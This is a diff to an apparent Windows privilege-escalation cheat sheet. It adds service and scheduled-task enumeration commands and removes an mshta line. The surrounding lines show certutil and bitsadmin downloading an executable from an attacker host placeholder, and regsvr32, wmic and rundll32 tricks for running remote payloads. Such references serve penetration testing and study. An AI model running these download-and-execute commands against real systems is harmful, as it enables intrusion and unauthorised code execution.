@@ -88,8 +88,10 @@ whoami /all
 
 # Unquoted services.
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+Get-CimInstance Win32_Service | where {$_.PathName -match " "} | select Name,PathName
 
 # Scheduled tasks.
+schtasks /query /fo LIST /v
 Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }
 
 # AlwaysInstallElevated.
@@ -111,7 +113,6 @@ certutil -urlcache -split -f http://<LHOST>/file.exe C:\Temp\file.exe
 bitsadmin /transfer job http://<LHOST>/file.exe C:\Temp\file.exe
 
 # Execute.
-mshta http://<LHOST>/payload.hta
 regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll
 wmic process call create "cmd /c whoami > C:\out.txt"
 rundll32 shell32.dll,ShellExec_RunDLL cmd.exe
